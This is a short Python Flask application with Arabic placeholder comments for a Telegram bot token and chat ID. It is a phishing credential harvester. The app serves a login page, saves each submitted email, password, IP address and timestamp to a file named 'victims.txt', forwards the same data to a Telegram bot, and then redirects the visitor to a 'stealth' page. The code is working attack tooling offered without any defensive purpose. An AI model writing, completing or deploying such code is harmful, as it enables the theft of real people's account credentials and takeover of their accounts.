from flask import Flask, request, redirect, render_template
from datetime import datetime
import requests

app = Flask(__name__)

BOT_TOKEN = "ضع_توكن_البوت_الخاص_بك"
CHAT_ID = "ضع_معرف_الشات_الخـاص_بك"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

@app.route("/", methods=["GET", "POST"])
def index():
    error = None
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        if not email or not password:
            error = "يرجى إدخال البريد وكلمة المرور"
        else:
            ip = request.remote_addr
            time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = f"[{time}] IP: {ip}\nEmail: {email}\nPassword: {password}"
            with open("victims.txt", "a", encoding="utf-8") as f:
                f.write(data + "\n")
            send_to_telegram(data)
            return redirect("/stealth")
    return render_template("index.html", error=error)

@app.route("/stealth")
def stealth():
    return render_template("stealth.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
